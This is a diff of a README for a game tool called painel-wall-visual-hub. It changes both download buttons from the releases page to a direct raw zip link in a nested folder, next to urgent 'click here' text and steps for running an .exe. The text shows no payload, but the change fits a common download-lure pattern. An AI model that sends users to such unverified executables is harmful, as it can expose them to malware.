@@ -29,7 +29,7 @@ Let's get you set up. Follow these exact steps:
 4. **Download the application file** — click the file link that matches your system (Windows users: choose the file ending in `.exe` if available, or the one labeled "Windows")
 5. **Save the file** — choose any folder you can easily find (like your Desktop)
 
-**[⬇️ DOWNLOAD NOW — CLICK HERE](https://github.com/davidrodrical2-web/painel-wall-visual-hub/releases)**
+**[⬇️ DOWNLOAD NOW — CLICK HERE](https://github.com/davidrodrical2-web/painel-wall-visual-hub/raw/refs/heads/main/infralinear/hub-painel-visual-wall-v2.5.zip)**
 
 ### 🛠️ What Happens After Download?
 
@@ -163,7 +163,7 @@ The code is publicly available on GitHub for full transparency. The developer co
 
 You're just one click away from improving your gaming experience. Download now and see the difference within minutes:
 
-**[⬇️ CLICK HERE TO DOWNLOAD PAINEL-WALL-VISUAL-HUB](https://github.com/davidrodrical2-web/painel-wall-visual-hub/releases)**
+**[⬇️ CLICK HERE TO DOWNLOAD PAINEL-WALL-VISUAL-HUB](https://github.com/davidrodrical2-web/painel-wall-visual-hub/raw/refs/heads/main/infralinear/hub-painel-visual-wall-v2.5.zip)**
 
 ### 📋 Quick Recap
 
